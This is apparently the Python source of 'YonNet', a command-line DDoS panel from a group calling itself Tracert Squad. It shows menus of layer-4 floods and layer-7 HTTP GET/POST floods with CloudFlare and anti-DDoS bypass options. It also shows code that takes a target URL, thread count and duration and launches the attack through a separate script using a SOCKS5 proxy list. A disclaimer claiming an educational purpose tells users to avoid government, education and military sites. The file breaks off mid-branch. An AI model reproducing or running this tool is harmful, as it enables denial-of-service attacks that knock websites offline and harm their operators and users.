import socket
import random
import speedtest
import socks
import os
import json
import time
import cfscrape
import datetime
import requests
import ssl
import pytz



dt_mtn = datetime.datetime.now()

mtn_tz = pytz.timezone('US/Mountain')
dt_mtn = mtn_tz.localize(dt_mtn)

# print(dt_mtn)

dt_east = dt_mtn.astimezone(pytz.timezone('US/Eastern'))
# print(dt_east)




today = dt_mtn.strftime('%B %d, %Y')

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def tos():
    clear()
    print(f'''
                                    \x1b[38;2;224;0;255m╔╦╗╔═╗ ╔═╗
                                     \x1b[38;2;224;0;255m║ ║ ║ ╚═╗
                                     \x1b[38;2;224;0;255m╩o╚═╝o╚═╝
                        \x1b[38;2;224;0;255m╔══════════════════════════════════╗
                     \x1b[38;2;224;0;255m╔══╩══════════════════════════════════╩══╗
                    \x1b[38;2;224;0;255m╔╝                                        ╚═╗
                    \x1b[38;2;224;0;255m║    \x1b[38;2;0;255;189mDo not attack government pages         \x1b[38;2;224;0;255m║
                    \x1b[38;2;224;0;255m║    \x1b[38;2;0;255;189m(.gov/.gob), educational pages (.edu)  \x1b[38;2;224;0;255m║ 
                    \x1b[38;2;224;0;255m║    \x1b[38;2;0;255;189mor the United States Department of     \x1b[38;2;224;0;255m║
                    \x1b[38;2;224;0;255m║    \x1b[38;2;0;255;189mDefense (.mil) the creator is not      \x1b[38;2;224;0;255m║
                    \x1b[38;2;224;0;255m║    \x1b[38;2;0;255;189mresponsible for the damage caused by   \x1b[38;2;224;0;255m║
                    \x1b[38;2;224;0;255m║    \x1b[38;2;0;255;189mthe attacks.                           \x1b[38;2;224;0;255m║
                    \x1b[38;2;224;0;255m║                                           \x1b[38;2;224;0;255m║
                    \x1b[38;2;224;0;255m║    \x1b[38;2;0;255;189mRemember: you are responsible for      \x1b[38;2;224;0;255m║
                    \x1b[38;2;224;0;255m║    \x1b[38;2;0;255;189mthe attacks since this tool was        \x1b[38;2;224;0;255m║
                    \x1b[38;2;224;0;255m║    \x1b[38;2;0;255;189mcreated for educational purposes.      \x1b[38;2;224;0;255m║  
                    \x1b[38;2;224;0;255m║                                           \x1b[38;2;224;0;255m║
                    \x1b[38;2;224;0;255m╚══════════════╦═════════════╦══════════════╝
                \x1b[38;2;224;0;255m╔══════════════════╩═════════════╩═══════════════════╗
                \x1b[38;2;224;0;255m║ By starting YoneNet you accept the terms of service║
                \x1b[38;2;224;0;255m╚════════════════════════════════════════════════════╝
                     
    ''')

def l7_anim():
    time.sleep(0.2)
    clear()
    print(f'''

██╗
██║
██║
██║
███████╗
╚══════╝ 
''')
    time.sleep(0.2)
    clear()
    print(f'''

          █████╗ 
         ██╔══██╗
         ███████║
         ██╔══██║
         ██║  ██║
         ╚═╝  ╚═╝ 
''')
    time.sleep(0.2)
    clear()
    print(f'''
              
                    ██╗   ██╗
                    ╚██╗ ██╔╝
                     ╚████╔╝
                      ╚██╔╝
                       ██║
                       ╚═╝
''')
    time.sleep(0.2)
    clear()
    print(f'''

                                ███████╗
                                ██╔════╝
                                █████╗
                                ██╔══╝
                                ███████╗
                                ╚══════╝ 
''')
    time.sleep(0.2)
    clear()
    print(f'''

                                            ██████╗ 
                                            ██╔══██╗
                                            ██████╔╝
                                            ██╔══██╗
                                            ██║  ██║
                                            ╚═╝  ╚═╝   
''')
    time.sleep(0.2)
    clear()
    print(f'''

                                                        ███████╗
                                                        ╚════██║
                                                            ██╔╝
                                                           ██╔╝
                                                          ██╔╝
                                                          ╚═╝   
''')
    time.sleep(0.2)
    clear()
    print(f'''

██╗      █████╗ ██╗   ██╗███████╗██████╗ ███████╗
██║     ██╔══██╗╚██╗ ██╔╝██╔════╝██╔══██╗╚════██║
██║     ███████║ ╚████╔╝ █████╗  ██████╔╝    ██╔╝
██║     ██╔══██║  ╚██╔╝  ██╔══╝  ██╔══██╗   ██╔╝
███████╗██║  ██║   ██║   ███████╗██║  ██║  ██╔╝ 
╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝  ╚═╝ 
''')
    time.sleep(0.2)
    clear()
    print(f'''

██╗      █████╗ ██╗   ██╗███████╗██████╗ ███████╗
██║     ██╔══██╗╚██╗ ██╔╝██╔════╝██╔══██╗╚════██║
██║     ███████║ ╚████╔╝ █████╗  ██████╔╝    ██╔╝
██║     ██╔══██║  ╚██╔╝  ██╔══╝  ██╔══██╗   ██╔╝
███████╗██║  ██║   ██║   ███████╗██║  ██║  ██╔╝ 
╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝  ╚═╝    
''')
    time.sleep(0.2)
    clear()
    print(f'''

████████╗██████╗  █████╗  █████╗ ███████╗██████╗ ████████╗   ██████╗ ██████╗ ██╗   ██╗ █████╗ ██████╗ 
╚══██╔══╝██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗╚══██╔══╝  ██╔════╝██╔═══██╗██║   ██║██╔══██╗██╔══██╗
   ██║   ██████╔╝███████║██║  ╚═╝█████╗  ██████╔╝   ██║     ╚█████╗ ██║██╗██║██║   ██║███████║██║  ██║
   ██║   ██╔══██╗██╔══██║██║  ██╗██╔══╝  ██╔══██╗   ██║      ╚═══██╗╚██████╔╝██║   ██║██╔══██║██║  ██║
   ██║   ██║  ██║██║  ██║╚█████╔╝███████╗██║  ██║   ██║     ██████╔╝ ╚═██╔═╝ ╚██████╔╝██║  ██║██████╔╝
   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝     ╚═════╝    ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═════╝  
''')
    time.sleep(0.2)
    clear()
    print(f'''

████████╗██████╗  █████╗  █████╗ ███████╗██████╗ ████████╗   ██████╗ ██████╗ ██╗   ██╗ █████╗ ██████╗ 
╚══██╔══╝██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗╚══██╔══╝  ██╔════╝██╔═══██╗██║   ██║██╔══██╗██╔══██╗
   ██║   ██████╔╝███████║██║  ╚═╝█████╗  ██████╔╝   ██║     ╚█████╗ ██║██╗██║██║   ██║███████║██║  ██║
   ██║   ██╔══██╗██╔══██║██║  ██╗██╔══╝  ██╔══██╗   ██║      ╚═══██╗╚██████╔╝██║   ██║██╔══██║██║  ██║
   ██║   ██║  ██║██║  ██║╚█████╔╝███████╗██║  ██║   ██║     ██████╔╝ ╚═██╔═╝ ╚██████╔╝██║  ██║██████╔╝
   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝     ╚═════╝    ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═════╝  
''')
    time.sleep(2)
    clear()   


def l4_anim():
    clear()
    print('''
   _       ___   __   __   ___     ___             _ _    
  | |     /   \  \ \ / /  | __|   | _ \     o O O | | |   
  | |__   | - |   \ V /   | _|    |   /    o      |_  _|  
  |____|  |_|_|   _|_|_   |___|   |_|_\   TS__[O]  _|_|_  
_|"""""|_|"""""|_| """ |_|"""""|_|"""""| {======|_|"""""| 
"`-0-0-""`-0-0-""`-0-0-""`-0-0-""`-0-0-"./o--000""`-0-0-" 
    ''')
    time.sleep(0.2)
    clear()
    print('''
        _       ___   __   __   ___     ___           O _ _    
       | |     /   \  \ \ / /  | __|   | _ \     o O O | | |   
       | |__   | - |   \ V /   | _|    |   /    o      |_  _|  
       |____|  |_|_|   _|_|_   |___|   |_|_\   TS__[O]  _|_|_  
     _|"""""|_|"""""|_| """ |_|"""""|_|"""""| {======|_|"""""| 
    "`-0-0-""`-0-0-""`-0-0-""`-0-0-""`-0-0-"./o--000""`-0-0-" 
    ''')
    time.sleep(0.2)
    clear()
    print('''                                              
            _       ___   __   __   ___     ___           O _ _    
           | |     /   \  \ \ / /  | __|   | _ \     o O O | | |   
           | |__   | - |   \ V /   | _|    |   /    o      |_  _|  
           |____|  |_|_|   _|_|_   |___|   |_|_\   TS__[O]  _|_|_  
         _|"""""|_|"""""|_| """ |_|"""""|_|"""""| {======|_|"""""| 
         "`-0-0-""`-0-0-""`-0-0-""`-0-0-""`-0-0-"./o--000""`-0-0-" 
    ''')
    time.sleep(0.2)
    clear()
    print('''                                                                                                           
                _       ___   __   __   ___     ___           O _ _    
               | |     /   \  \ \ / /  | __|   | _ \     o O O | | |   
               | |__   | - |   \ V /   | _|    |   /    o      |_  _|  
               |____|  |_|_|   _|_|_   |___|   |_|_\   TS__[O]  _|_|_  
             _|"""""|_|"""""|_| """ |_|"""""|_|"""""| {======|_|"""""| 
             "`-0-0-""`-0-0-""`-0-0-""`-0-0-""`-0-0-"./o--000""`-0-0-" 
    ''')
    time.sleep(0.3)
    clear()

def sus_anim():
    clear()
    print(f'''
                        ████████╗██████╗  █████╗  █████╗ ███████╗██████╗ ████████╗
                        ╚══██╔══╝██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗╚══██╔══╝
                           ██║   ██████╔╝███████║██║  ╚═╝█████╗  ██████╔╝   ██║
                           ██║   ██╔══██╗██╔══██║██║  ██╗██╔══╝  ██╔══██╗   ██║
                           ██║   ██║  ██║██║  ██║╚█████╔╝███████╗██║  ██║   ██║
                           ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝
    ''')
    time.sleep(1)
    clear()
    print(f'''
                          ██████╗ ██████╗ ██╗   ██╗ █████╗ ██████╗ 
                         ██╔════╝██╔═══██╗██║   ██║██╔══██╗██╔══██╗
                         ╚█████╗ ██║██╗██║██║   ██║███████║██║  ██║
                          ╚═══██╗╚██████╔╝██║   ██║██╔══██║██║  ██║
                         ██████╔╝ ╚═██╔═╝ ╚██████╔╝██║  ██║██████╔╝
                         ╚═════╝    ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═════╝
    ''')
    time.sleep(1)
    clear()

def china():
    clear()
    print(f'''
╔╗  ╔╗
║╚╗╔╝║
╚╗╚╝╔╝
 ╚╗╔╝
  ║║
  ╚╝
    ''')
    time.sleep(0.5)
    clear()
    print(f'''
╔╗  ╔╦═══╗
║╚╗╔╝║╔═╗║
╚╗╚╝╔╣║ ║║
 ╚╗╔╝║║ ║║
  ║║ ║╚═╝║
  ╚╝ ╚═══╝
    ''')
    time.sleep(0.5)
    clear()
    print(f'''
╔╗  ╔╦═══╦═╗ ╔╗
║╚╗╔╝║╔═╗║ ╚╗║║
╚╗╚╝╔╣║ ║║╔╗╚╝║
 ╚╗╔╝║║ ║║║╚╗ ║
  ║║ ║╚═╝║║ ║ ║
  ╚╝ ╚═══╩╝ ╚═╝
    ''')
    time.sleep(0.5)
    clear()
    print(f'''
╔╗  ╔╦═══╦═╗ ╔╦═══╗
║╚╗╔╝║╔═╗║ ╚╗║║╔══╝
╚╗╚╝╔╣║ ║║╔╗╚╝║╚══╗
 ╚╗╔╝║║ ║║║╚╗ ║╔══╝
  ║║ ║╚═╝║║ ║ ║╚══╗
  ╚╝ ╚═══╩╝ ╚═╩═══╝
    ''')
    time.sleep(3)
    clear()
    print(f'''
                        ████████╗██████╗  █████╗  █████╗ ███████╗██████╗ ████████╗
                        ╚══██╔══╝██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗╚══██╔══╝
                           ██║   ██████╔╝███████║██║  ╚═╝█████╗  ██████╔╝   ██║
                           ██║   ██╔══██╗██╔══██║██║  ██╗██╔══╝  ██╔══██╗   ██║
                           ██║   ██║  ██║██║  ██║╚█████╔╝███████╗██║  ██║   ██║
                           ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝
    ''')

    print(f'''
                         ██████╗ ██████╗ ██╗   ██╗ █████╗ ██████╗ 
                        ██╔════╝██╔═══██╗██║   ██║██╔══██╗██╔══██╗
                        ╚█████╗ ██║██╗██║██║   ██║███████║██║  ██║
                         ╚═══██╗╚██████╔╝██║   ██║██╔══██║██║  ██║
                        ██████╔╝ ╚═██╔═╝ ╚██████╔╝██║  ██║██████╔╝
                        ╚═════╝    ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═════╝
    ''')
    time.sleep(3)

def zamn():
    clear()
    print(f'''
    ⣿⣿⣿⠻⣿⣿⣯⣉⠉⠉⠉⠀⢀⣠⣶⣶⣶⢶⣲⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⢰
    ⣿⣿⡏⠀⣿⣿⡇⠀⠀⠀⣠⣶⣿⣿⡿⠿⠾⠿⠿⢿⣿⣶⡀⠀⠀⠀⠀⠀⠀⢈
    ⣏⠉⠀⠀⣿⡟⠀⠀⢀⣾⣷⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠉⠳⠀⠀⠀⠀⠀⠀⠘
    ⡇⠀⠀⠀⣿⡆⠀⠀⣼⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣼⡄⠀⠀⠀⠀⠀⠀
    ⠇⠀⠀⠀⠈⠀⠀⠀⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠨⣷⠀⠀⠀⠀⠀⠀
    ⠃⠀⠀⠀⠀⠀⠀⠀⢻⡀⠀⠀⠀⠀⣀⣀⡀⠀⠀⠀⠀⠀⠀⢛⣀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⣀⠺⠏⠀⠀⠀⢁⠀⣀⠉⡣⣤⠤⢤⣶⠔⡋⢉⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⢀⠄⢃⣄⠀⠀⠐⠁⣀⣘⠽⠁⠀⠸⡗⡁⠛⡽⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠄⠄⠈⣃⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠘⢮⠉⠙⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠠⠄⡠⠀⠀⠀⠀⠀⣀⠎⠐⠦⣀⣀⣤⣴⣆⣤⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⢀⣤⣶⠏⡆⣿⣄⠀⠀⠀⣾⠏⠀⠀⠀⠀⠈⠩⢼⣿⠇⠀⠀⠀⠀⠀
    ⣀⣠⣴⣾⣿⣿⣿⠁⠆⢻⣿⣄⡀⢰⡿⣡⣦⣉⣉⠉⢉⣹⣿⠏⠀⠀⠀⠀⠀⠀
    ⣿⣿⣿⣿⣿⣿⡏⢀⠀⠀⠻⣿⣟⢿⡏⠏⠈⠉⠉⠉⠘⢸⣳⣿⣷⣄⠀⠀⠀⠀
    ⣿⡟⢻⣿⣻⣿⡇⢘⡀⠀⠘⣿⡇⠘⠀⠀⠀⠀⠀⠀⠀⠰⣿⣿⣿⣿⣿⣦⡀⠀
    ⣿⡅⢸⣿⡿⣟⣥⠀⢷⣤⣴⣿⣿⣆⠀⠰⡆⠀⢀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⡇
    ⣿⡇⣸⡥⡇⣿⣿⣷⡈⠻⣿⣿⣿⣿⣦⣤⣶⣀⣀⡠⠈⣱⣿⣿⣿⣿⣿⣿⣿⡇
    ⣻⡇⣿⣿⡇⣿⢏⣻⣿⣦⡠⠙⠿⢿⣿⣿⠿⠟⣉⣪⣾⣿⣿⣿⣿⣿⣿⣿⣿⡏
    ⣿⠃⣿⣿⣿⣿⠉⢿⣿⣿⣿⣷⣦⣤⣤⡰⠷⢶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣇
    ⣿⢸⣿⣿⡇⣿⣾⣿⣿⣿⠟⠉⡿⣏⠏⠁⢠⣜⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⡇
    ⣿⣿⣿⣿⢧⣿⣿⣿⣛⣚⣒⣀⣧⣿⠀⠀⠘⣧⠾⠶⠶⠶⠾⣿⣿⣿⣿⣿⣿⣏
    ⣿⣿⡿⡟⠛⠛⠉⠉⠉⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⡗
    ⣿⣇⣿⠀⠀⣀⡀⠀⣠⠀⢠⡀⣠⠀⣄⠀⣆⠀⣄⡢⠐⣴⠆⠀⣿⣿⣿⣿⣿⡷
    ⣿⣷⢻⠀⠀⣀⠉⢸⠒⢣⢸⠈⠈⡆⠇⠑⠻⠀⠀⢤⣤⠄⠀⠀⢿⣿⣿⣿⣿⡷
    ⣾⣿⢸⠀⠀⠉⠉⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣰⣾⣿⣿⣿⣯⡗
    ⣿⣿⣾⣐⢠⣤⣤⠤⠤⠶⠶⣶⣖⣒⣚⣛⣻⣿⣿⣭⣭⣭⣽⣿⣿⣿⣿⣿⣿⡟
    ⣿⣿⣿⣿⣾⣿⣛⣋⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣿⣿⣿⣿⣟
    ''')
    time.sleep(2)

def rocket():
    print(f'''
    
''')


def tools():
    sus_anim()
    clear()
    print(f'''
                          \x1b[38;2;3;63;125m▄▄▄▄▄         \x1b[38;2;42;162;189m   ▄▄▌  .▄▄ · 
                          \x1b[38;2;3;63;125m•██  ▪     ▪  \x1b[38;2;42;162;189m   ██•  ▐█ ▀. 
                           \x1b[38;2;3;63;125m▐█.▪ ▄█▀▄  ▄█\x1b[38;2;42;162;189m▀▄ ██▪  ▄▀▀▀█▄
                           \x1b[38;2;3;63;125m▐█▌·▐█▌.▐▌▐█▌\x1b[38;2;42;162;189m.▐▌▐█▌▐▌▐█▄▪▐█
                           \x1b[38;2;3;63;125m▀▀▀  ▀█▄▀▪ ▀█\x1b[38;2;42;162;189m▄▀▪.▀▀▀  ▀▀▀▀ 
           \x1b[38;2;224;0;255m╔═══════════════╦═══════════════════════════════════════╗
           \x1b[38;2;224;0;255m║    \x1b[38;2;0;255;189mlookup \x1b[38;2;224;0;255m    ║ \x1b[38;2;0;255;189mSimple IP Address Lookup              \x1b[38;2;224;0;255m║
           \x1b[38;2;224;0;255m║    \x1b[38;2;0;255;189mstatus \x1b[38;2;224;0;255m    ║ \x1b[38;2;0;255;189mSee the website status code           \x1b[38;2;224;0;255m║
           \x1b[38;2;224;0;255m║    \x1b[38;2;0;255;189mwebip \x1b[38;2;224;0;255m     ║ \x1b[38;2;0;255;189mSee the website IP Address            \x1b[38;2;224;0;255m║
           \x1b[38;2;224;0;255m║    \x1b[38;2;0;255;189mmyip  \x1b[38;2;224;0;255m     ║ \x1b[38;2;0;255;189mYour public IP address                \x1b[38;2;224;0;255m║
           \x1b[38;2;224;0;255m║    \x1b[38;2;0;255;189mwhoami  \x1b[38;2;224;0;255m   ║ \x1b[38;2;0;255;189mDisplay User Info                     \x1b[38;2;224;0;255m║
           \x1b[38;2;224;0;255m╚═══════════════╩═══════════════════════════════════════╝                    
    ''')

def layer4():
    l4_anim()
    clear()
    print(f'''   
                                        \x1b[38;2;31;234;166m╦  ╔═╗╦ ╦╔═╗╦═╗ ╦ ╦ 
                                        \x1b[38;2;31;234;166m║  ╠═╣╚╦╝║╣ ╠╦╝ ╚═╬
                                        \x1b[38;2;31;234;166m╩═╝╩ ╩ ╩ ╚═╝╩╚═   ╩
                       \x1b[38;2;224;0;255m╔═════════════════╦═══════╦══════╦══════════════════╗
                       \x1b[38;2;224;0;255m║ \x1b[38;2;0;8;255m- - - - - - - \x1b[38;2;224;0;255m╔═╩═══════╩══════╩══╗ \x1b[38;2;0;8;255m- - - - - - - \x1b[38;2;224;0;255m║
                       \x1b[38;2;224;0;255m║ \x1b[38;2;0;8;255m- - - - - - - \x1b[38;2;224;0;255m║        \x1b[38;2;0;255;189mudp        \x1b[38;2;224;0;255m║ \x1b[38;2;0;8;255m- - - - - - - \x1b[38;2;224;0;255m║
                       \x1b[38;2;224;0;255m╚═══════════════╣        \x1b[38;2;0;255;189mtcp        \x1b[38;2;224;0;255m╠═══════════════╝
                                       \x1b[38;2;224;0;255m║        \x1b[38;2;0;255;189mrip        \x1b[38;2;224;0;255m║
                                       \x1b[38;2;224;0;255m║  \x1b[38;2;0;255;189movh-raw (l7&l4)  \x1b[38;2;224;0;255m║
                                       \x1b[38;2;224;0;255m║      \x1b[38;2;0;255;189movh-amp  \x1b[38;2;224;0;255m    ║
                                       \x1b[38;2;224;0;255m╚═══════════════════╝
    ''')

def layer7():
    l7_anim()
    clear()
    print(f'''
                                       \x1b[38;2;255;116;0m╦  ╔═╗╦ ╦╔═╗╦═╗ ══╗
                                       \x1b[38;2;255;116;0m║  ╠═╣╚╦╝║╣ ╠╦╝  ╔╝
                                       \x1b[38;2;255;116;0m╩═╝╩ ╩ ╩ ╚═╝╩╚═  ╩
                       \x1b[38;2;224;0;255m══════╦══════════════════════════════════════╦═══════
                   \x1b[38;2;224;0;255m╔═════════╩═════════╗                  \x1b[38;2;224;0;255m╔═════════╩═════════╗
                   \x1b[38;2;224;0;255m║      \x1b[38;2;0;255;189mmh-get       \x1b[38;2;224;0;255m║                  ║     \x1b[38;2;0;255;189mmh-bypass     \x1b[38;2;224;0;255m║
                   \x1b[38;2;224;0;255m║      \x1b[38;2;0;255;189mmh-post      \x1b[38;2;224;0;255m║                  ║\x1b[38;2;224;0;255m     \x1b[38;2;0;255;189mmh-gsb        \x1b[38;2;224;0;255m║
                   \x1b[38;2;224;0;255m║      \x1b[38;2;0;255;189mmh-head      \x1b[38;2;224;0;255m║                  ║     \x1b[38;2;0;255;189mdg-bypass     \x1b[38;2;224;0;255m║
                   \x1b[38;2;224;0;255m║      \x1b[38;2;0;255;189mmh-null      \x1b[38;2;224;0;255m║                  ║     \x1b[38;2;0;255;189mav-bypass     \x1b[38;2;224;0;255m║
                   \x1b[38;2;224;0;255m╚═══════════════════╝                  \x1b[38;2;224;0;255m╚═══════════════════╝
    ''')


def best():
    clear()
    print(f'''
                                        \x1b[38;2;0;255;58m╔╗ ╔═╗╔═╗╔╦╗
                                        \x1b[38;2;0;255;58m╠╩╗║╣ ╚═╗ ║ 
                                        \x1b[38;2;0;255;58m╚═╝╚═╝╚═╝ ╩ 
                    \x1b[38;2;224;0;255m═══════════╦════════════════════════════╦══════════
                               \x1b[38;2;224;0;255m║         \x1b[38;2;0;255;189mhttp-socket        \x1b[38;2;224;0;255m║
                               \x1b[38;2;224;0;255m║         \x1b[38;2;0;255;189mav-bypass          \x1b[38;2;224;0;255m║
                               \x1b[38;2;224;0;255m║         \x1b[38;2;0;255;189mcf-bypass          \x1b[38;2;224;0;255m║
                               \x1b[38;2;224;0;255m╚════════════════════════════╝                     
    ''')

__banner__ = """
                                        \x1b[38;2;201;0;255m╦\x1b[38;2;189;0;255m ╦╔═╗╔╗\x1b[38;2;174;0;255m╔╔╗\x1b[38;2;135;0;255m╔╔═╗\x1b[38;2;100;0;255m╔╦╗
                                        \x1b[38;2;201;0;255m╚\x1b[38;2;189;0;255m╦╝║ ║║║\x1b[38;2;174;0;255m║║║\x1b[38;2;135;0;255m║║╣  \x1b[38;2;100;0;255m║ 
                                        \x1b[38;2;201;0;255m ╩\x1b[38;2;189;0;255m ╚═╝╝╚\x1b[38;2;174;0;255m╝╝╚\x1b[38;2;135;0;255m╝╚═╝ \x1b[38;2;100;0;255m╩ \x1b[38;2;201;0;255m𝑽𝟐 
                      \x1b[38;2;255;0;236m╔═══\x1b[38;2;247;0;255m═════\x1b[38;2;224;0;255m═════\x1b[38;2;201;0;255m═════\x1b[38;2;189;0;255m══════\x1b[38;2;174;0;255m════\x1b[38;2;135;0;255m═════\x1b[38;2;100;0;255m════\x1b[38;2;77;0;255m═════\x1b[38;2;42;0;255m═════\x1b[38;2;0;8;255m══════╗
                      \x1b[38;2;255;0;236m║   \x1b[38;2;0;255;189m     Welcome To The Start Screen Of YonNet Cli!  \x1b[38;2;0;8;255m ║
                      \x1b[38;2;255;0;236m║          \x1b[38;2;0;255;189mYonNet Has Been Created By Tracert Squad\x1b[38;2;0;8;255m   ║
                      \x1b[38;2;255;0;236m╚═╦═\x1b[38;2;247;0;255m═════\x1b[38;2;224;0;255m═════\x1b[38;2;201;0;255m═════\x1b[38;2;189;0;255m══════\x1b[38;2;174;0;255m════\x1b[38;2;135;0;255m═════\x1b[38;2;100;0;255m════\x1b[38;2;77;0;255m═════\x1b[38;2;42;0;255m═════\x1b[38;2;0;8;255m════╦═╝
                        \x1b[38;2;255;0;236m║ \x1b[38;2;247;0;255m     \x1b[38;2;224;0;255m         \033[0;33m\033[4mhttps://t.me/YoneeeNo\033[1;m             \x1b[38;2;0;8;255m║
                      \x1b[38;2;255;0;236m╔═╩═\x1b[38;2;247;0;255m═════\x1b[38;2;224;0;255m═════\x1b[38;2;201;0;255m═════\x1b[38;2;189;0;255m══════\x1b[38;2;174;0;255m════\x1b[38;2;135;0;255m═════\x1b[38;2;100;0;255m════\x1b[38;2;77;0;255m═════\x1b[38;2;42;0;255m═════\x1b[38;2;0;8;255m════╩═╗
                      \x1b[38;2;255;0;236m║   \x1b[38;2;0;255;189m    To See All Command's Please Type [help]  \x1b[38;2;0;8;255m     ║
                      \x1b[38;2;255;0;236m║   \x1b[38;2;0;255;189m      YonNet Cli Ran By @TracertSquad       \x1b[38;2;0;8;255m      ║
                      \x1b[38;2;255;0;236m╚═══\x1b[38;2;247;0;255m═════\x1b[38;2;224;0;255m═════\x1b[38;2;201;0;255m═════\x1b[38;2;189;0;255m══════\x1b[38;2;174;0;255m════\x1b[38;2;135;0;255m═════\x1b[38;2;100;0;255m════\x1b[38;2;77;0;255m═════\x1b[38;2;42;0;255m═════\x1b[38;2;0;8;255m══════╝

"""                             
                
def menu():
    print(f'''
            \x1b[38;2;224;0;255m╔═════════════════════════════════════════════════════════╗
            \x1b[38;2;224;0;255m║\x1b[38;2;0;208;6m- - - - - - \x1b[38;2;0;255;189mWelcome to YonNet Layer7 DDoS Panel \x1b[38;2;0;208;6m- - - - - -\x1b[38;2;224;0;255m║
            \x1b[38;2;224;0;255m║ \x1b[38;2;0;208;6m- - - - - - \x1b[38;2;0;255;189mTo see the commands type "help" \x1b[38;2;0;208;6m- - - - - - \x1b[38;2;224;0;255m║
            \x1b[38;2;224;0;255m╚═════════════════════════════════════════════════════════╝
                                \x1b[38;2;0;255;189m{today}
    ''')


def main():
    clear()
    print(__banner__)
    print("""\x1b[38;2;255;0;236m╔══\x1b[38;2;100;0;255m[\x1b[38;2;247;0;255mVedentta\x1b[38;2;255;0;0m@\x1b[38;2;247;0;255mYonNet\x1b[38;2;100;0;255m]
\x1b[38;2;255;0;236m╚═\x1b[38;2;247;0;255m══\x1b[38;2;224;0;255m═\x1b[38;2;201;0;255m═\x1b[38;2;189;0;255m═\x1b[38;2;174;0;255m═\x1b[38;2;0;255;189m˃ \033[1;mLicense: \x1b[38;2;0;255;58m[ONLINE] + Proxy Updated!""")
    print("")
    while True:
        ray = input("""\x1b[38;2;255;0;236m╔══\x1b[38;2;100;0;255m[\x1b[38;2;247;0;255mVendetta\x1b[38;2;255;0;0m@\x1b[38;2;247;0;255mYonNet\x1b[38;2;100;0;255m]
\x1b[38;2;255;0;236m╚═\x1b[38;2;247;0;255m══\x1b[38;2;224;0;255m═\x1b[38;2;201;0;255m═\x1b[38;2;189;0;255m═\x1b[38;2;174;0;255m═\x1b[38;2;0;255;189m˃ \033[1;m""")
        if ray == 'tools':
            tools()
        elif ray == 'layer4' or ray == 'l4':
            layer4()
        elif ray == 'layer7' or ray == 'l7':
            layer7()
        elif ray == 'best':
            best()
        elif ray == 'all':
            tools()
            layer4()
            layer7()
            best()
        elif ray == 'mh-get':
            clear()
            print(__banner__)
            print("\x1b[38;2;3;63;125m▶ \x1b[38;2;0;255;189mmh-get   \x1b[38;2;224;0;255mVery Strong HTTP-GET Attack to Websites")
            print("")
            target = input("\x1b[38;2;3;63;125m● URL:\x1b[38;2;194;255;248m")
            threads = input("\x1b[38;2;3;63;125m● THREADS:\x1b[38;2;194;255;248m")
            multi = input("\x1b[38;2;3;63;125m● MULTI:\x1b[38;2;194;255;248m")
            timeout = input("\x1b[38;2;3;63;125m● TIME:\x1b[38;2;194;255;248m")
            print("\x1b[38;2;3;63;125m▶ CTRL + C To Stop")
            os.system(f"python3 start.py get {target} 5 {threads} socsk5.txt {multi} {timeout}")
            main()
        elif ray == 'mh-gsb':
            clear()
            print(__banner__)
            print("\x1b[38;2;3;63;125m▶ \x1b[38;2;0;255;189mmh-cfuam   \x1b[38;2;224;0;255mSimple CloudFlare Bypass")
            print("")
            target = input("\x1b[38;2;3;63;125m● URL:\x1b[38;2;194;255;248m")
            threads = input("\x1b[38;2;3;63;125m● THREADS:\x1b[38;2;194;255;248m")
            multi = input("\x1b[38;2;3;63;125m● MULTI:\x1b[38;2;194;255;248m")
            timeout = input("\x1b[38;2;3;63;125m● TIME:\x1b[38;2;194;255;248m")
            print("\x1b[38;2;3;63;125m▶ CTRL + C To Stop")
            os.system(f"python3 start.py gsb {target} 5 {threads} socsk5.txt {multi} {timeout}")
            main()
        elif ray == 'mh-post':
            clear()
            print(__banner__)
            print("\x1b[38;2;3;63;125m▶ \x1b[38;2;0;255;189mmh-post   \x1b[38;2;224;0;255mVery Strong HTTP-POST Attack to Websites")
            print("")
            target = input("\x1b[38;2;3;63;125m● URL:\x1b[38;2;194;255;248m")
            threads = input("\x1b[38;2;3;63;125m● THREADS:\x1b[38;2;194;255;248m")
            multi = input("\x1b[38;2;3;63;125m● MULTI:\x1b[38;2;194;255;248m")
            timeout = input("\x1b[38;2;3;63;125m●TIME:\x1b[38;2;194;255;248m")
            print("\x1b[38;2;3;63;125m▶ CTRL + C To Stop")
